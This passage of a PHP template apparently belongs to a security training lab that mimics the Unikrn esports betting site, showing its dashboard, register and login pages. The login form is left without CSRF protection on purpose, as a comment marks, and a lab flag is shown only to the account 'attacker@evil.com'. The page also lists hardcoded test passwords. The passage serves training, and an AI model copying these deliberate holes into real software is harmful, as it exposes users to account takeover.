          <?php $wr = in_array($currentUser['username'], ['Blaze_Runner','ApexPredator_X']) ? '67%' : ($currentUser['username']==='NovaStrike_99' ? '58%' : '0%'); ?>
          <div class="uk-stat-val" style="color:#10B981;"><?= $wr ?></div>
          <div class="uk-stat-sub">last 30 days</div>
        </div>
      </div>

      <!-- Profile card -->
      <div class="uk-card">
        <div class="uk-card-hd">
          <div class="uk-card-title">
            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            Account Info
          </div>
        </div>
        <div class="profile-row">
          <div class="profile-av-lg"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
          <div class="profile-info">
            <div class="profile-name"><?= esc($currentUser['username']) ?></div>
            <div class="profile-email"><?= esc($currentUser['email']) ?></div>
            <div class="profile-badges">
              <span class="p-badge pb-level">Level <?= esc($currentUser['level']) ?></span>
              <?php if ($currentUser['steam_linked']): ?>
                <span class="p-badge pb-steam">Steam Linked</span>
              <?php else: ?>
                <span class="p-badge pb-nosteam">Steam Not Linked</span>
              <?php endif; ?>
            </div>
          </div>
        </div>
        <?php if ($currentUser['email'] === 'attacker@evil.com'): ?>
        <div class="vip-box">
          <div class="vip-label">🔑 API Secret Token</div>
          <div class="vip-token"><?= LAB_FLAG ?></div>
          <div class="vip-note">Your developer API access token. Keep this secret — do not share.</div>
        </div>
        <?php endif; ?>
      </div>

      <!-- Bet history -->
      <div class="uk-card">
        <div class="uk-card-hd">
          <div class="uk-card-title">
            <svg viewBox="0 0 24 24"><path d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
            Bet History
          </div>
          <span style="font-size:.7rem;color:#6B7280;"><?= count($userBets) ?> bets</span>
        </div>
        <?php if ($userBets): ?>
        <table class="uk-table">
          <thead>
            <tr>
              <th>Game</th><th>Match</th><th>Pick</th>
              <th>Stake</th><th>Result</th><th>P&L</th><th>Date</th>
            </tr>
          </thead>
          <tbody>
            <?php foreach ($userBets as $b): ?>
            <?php
              $gc = match($b['game']) {
                  'CS:GO'  => 'bg-csgo',
                  'LoL'    => 'bg-lol',
                  'Dota 2' => 'bg-dota',
                  'Halo 5' => 'bg-halo',
                  default  => 'bg-other',
              };
              $rc = match($b['result']) {
                  'WIN'     => 'r-win',
                  'LOSS'    => 'r-loss',
                  'PENDING' => 'r-pending',
                  default   => '',
              };
              $pc = str_starts_with($b['pnl'], '+') ? 'pnl-pos' : (str_starts_with($b['pnl'], '−') ? 'pnl-neg' : 'pnl-na');
            ?>
            <tr>
              <td><span class="badge-game <?= $gc ?>"><?= esc($b['game']) ?></span></td>
              <td style="color:#9CA3AF;"><?= esc($b['match']) ?></td>
              <td><?= esc($b['pick']) ?></td>
              <td><?= esc($b['stake']) ?> UC</td>
              <td class="<?= $rc ?>"><?= esc($b['result']) ?></td>
              <td class="<?= $pc ?>"><?= esc($b['pnl']) ?></td>
              <td style="color:#6B7280;white-space:nowrap;"><?= esc($b['date']) ?></td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
        <?php else: ?>
        <div style="padding:20px 16px;font-size:.8rem;color:#6B7280;">No bets placed yet.</div>
        <?php endif; ?>
      </div>

      <!-- Steam connection -->
      <div class="uk-card">
        <div class="uk-card-hd">
          <div class="uk-card-title">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/><path d="M8.5 16.5l2-5 5-2-2 5-5 2z"/></svg>
            Steam Connection
          </div>
        </div>
        <div class="steam-row">
          <div class="steam-icon">
            <svg viewBox="0 0 24 24"><path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142V8.91c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.016-1.173-3.331-2.727L.436 15.27C1.862 20.307 6.486 24 11.979 24c6.627 0 11.999-5.373 11.999-12S18.605 0 11.979 0zM7.54 18.21l-1.473-.61c.262.543.714.999 1.314 1.25 1.297.539 2.793-.076 3.332-1.375.263-.63.264-1.319.005-1.949s-.75-1.121-1.377-1.383c-.624-.26-1.29-.249-1.878-.03l1.523.63c.956.4 1.409 1.5 1.009 2.455-.397.957-1.497 1.41-2.455 1.012H7.54zm11.415-9.303c0-1.662-1.353-3.015-3.015-3.015-1.665 0-3.015 1.353-3.015 3.015 0 1.665 1.35 3.015 3.015 3.015 1.663 0 3.015-1.35 3.015-3.015zm-5.273-.005c0-1.252 1.013-2.266 2.265-2.266 1.249 0 2.266 1.014 2.266 2.266 0 1.251-1.017 2.265-2.266 2.265-1.252 0-2.265-1.014-2.265-2.265z"/></svg>
          </div>
          <div class="steam-info">
            <?php if ($currentUser['steam_linked']): ?>
            <div class="steam-name">Steam Account Connected</div>
            <div class="steam-status-linked"><?= esc($currentUser['username']) ?> · Last synced Apr 17, 2018</div>
            <?php else: ?>
            <div class="steam-name">No Steam Account Linked</div>
            <div class="steam-status-none">Connect your Steam account to unlock exclusive esports rewards</div>
            <?php endif; ?>
          </div>
          <?php if ($currentUser['steam_linked']): ?>
          <span class="steam-badge-linked">✓ Linked</span>
          <?php else: ?>
          <button class="btn-steam-connect">Connect Steam</button>
          <?php endif; ?>
        </div>
      </div>

    </main>
  </div><!-- /uk-dash -->
</div><!-- /uk-body -->

<div class="uk-footer">
  <span>Unikrn &copy; 2018 &middot; <a href="#">About</a> &middot; <a href="#">Terms</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Support</a></span>
  <span>All bets are final &middot; Play responsibly &middot; 18+</span>
</div>

<?php elseif ($action === 'register'): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     REGISTER PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="uk-body">
  <div class="uk-auth-wrap">
    <div class="uk-auth-card">
      <div class="uk-auth-logo">
        <div class="mark">U</div>
        <span class="wordmark">Uni<span>krn</span></span>
      </div>
      <div class="uk-auth-title">Create your account</div>
      <div class="uk-auth-sub">Start betting on esports today</div>
      <?php if ($error): ?>
      <div class="uk-error"><?= esc($error) ?></div>
      <?php endif; ?>
      <form method="POST" action="/index.php?action=register">
        <div class="uk-field">
          <label>Email Address</label>
          <input type="email" name="usr" placeholder="you@example.com" required autocomplete="email">
        </div>
        <div class="uk-field">
          <label>Password</label>
          <input type="password" name="pwd" placeholder="Choose a strong password" required autocomplete="new-password">
        </div>
        <button type="submit" class="uk-btn-submit">Create Account</button>
      </form>
      <div class="uk-auth-foot">
        Already have an account? <a href="/index.php">Sign in</a>
      </div>
    </div>
  </div>
</div>

<div class="uk-footer">
  <span>Unikrn &copy; 2018 &middot; <a href="#">Terms</a> &middot; <a href="#">Privacy</a></span>
  <span>18+ only &middot; Gamble responsibly</span>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE — /apiv1/login (THE VULNERABLE ENDPOINT)
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="uk-body">
  <div class="uk-auth-wrap">
    <div class="uk-auth-card">
      <div class="uk-auth-logo">
        <div class="mark">U</div>
        <span class="wordmark">Uni<span>krn</span></span>
      </div>
      <div class="uk-auth-title">Sign in to Unikrn</div>
      <div class="uk-auth-sub">Bet on esports. Win real money.</div>

      <?php if ($error): ?>
      <div class="uk-error"><?= esc($error) ?></div>
      <?php endif; ?>

      <!-- ⚠ VULNERABLE: No CSRF token field. No hidden token. POST /apiv1/login
           accepts usr+pwd from ANY origin with no session or token validation. -->
      <form method="POST" action="/index.php">
        <div class="uk-field">
          <label>Email</label>
          <input type="email" name="usr" placeholder="your@email.com" required autocomplete="email">
        </div>
        <div class="uk-field">
          <label>Password</label>
          <input type="password" name="pwd" placeholder="Your password" required autocomplete="current-password">
        </div>
        <button type="submit" class="uk-btn-submit">Sign In</button>
      </form>

      <div class="uk-divider">or continue with</div>

      <button class="uk-social-btn" disabled>
        <svg viewBox="0 0 24 24"><path d="M20.317 10.492c0-.66-.057-1.293-.163-1.9H12v3.59h4.661a3.985 3.985 0 01-1.729 2.61v2.169h2.8c1.636-1.507 2.585-3.727 2.585-6.469z" fill="#4285F4"/><path d="M12 21c2.34 0 4.303-.776 5.736-2.099l-2.8-2.17c-.777.52-1.769.828-2.936.828-2.258 0-4.17-1.524-4.852-3.572H4.26v2.24A9 9 0 0012 21z" fill="#34A853"/><path d="M7.148 13.987A5.41 5.41 0 016.862 12c0-.69.12-1.36.286-1.987V7.773H4.26A9.007 9.007 0 003 12c0 1.452.349 2.826.26 4.026l2.888-2.04z" fill="#FBBC05"/><path d="M12 6.576c1.272 0 2.41.438 3.309 1.296l2.48-2.48C16.3 3.991 14.338 3 12 3A9 9 0 004.26 7.774l2.888 2.24C7.83 8.1 9.742 6.576 12 6.576z" fill="#EA4335"/></svg>
        Continue with Google
      </button>
      <button class="uk-social-btn" disabled style="color:#C6D4DF;">
        <svg viewBox="0 0 24 24"><path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142V8.91c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.016-1.173-3.331-2.727L.436 15.27C1.862 20.307 6.486 24 11.979 24c6.627 0 11.999-5.373 11.999-12S18.605 0 11.979 0z"/></svg>
        Sign in with Steam
      </button>

      <div class="uk-ta-box">
        <div class="uk-ta-hdr">📋 Test Accounts</div>
        <div class="uk-ta-row"><span class="uk-ta-email">blaze@unikrn.com</span><span class="uk-ta-pass">blaze@123</span><span class="uk-ta-badge">User</span></div>
        <div class="uk-ta-row"><span class="uk-ta-email">nova@unikrn.com</span><span class="uk-ta-pass">nova@123</span><span class="uk-ta-badge">User</span></div>
        <div class="uk-ta-row"><span class="uk-ta-email">apex@unikrn.com</span><span class="uk-ta-pass">apex@123</span><span class="uk-ta-badge">User</span></div>
      </div>
      <div class="uk-auth-foot">
        New to Unikrn? <a href="/index.php?action=register">Create account</a>
      </div>
    </div>
  </div>
</div>

<div class="uk-footer">
  <span>Unikrn &copy; 2018 &middot; <a href="#">About</a> &middot; <a href="#">Terms</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Responsible Gaming</a></span>
  <span>18+ only &middot; Gambling can be addictive</span>
</div>
<?php endif; ?>

</body>
</html>
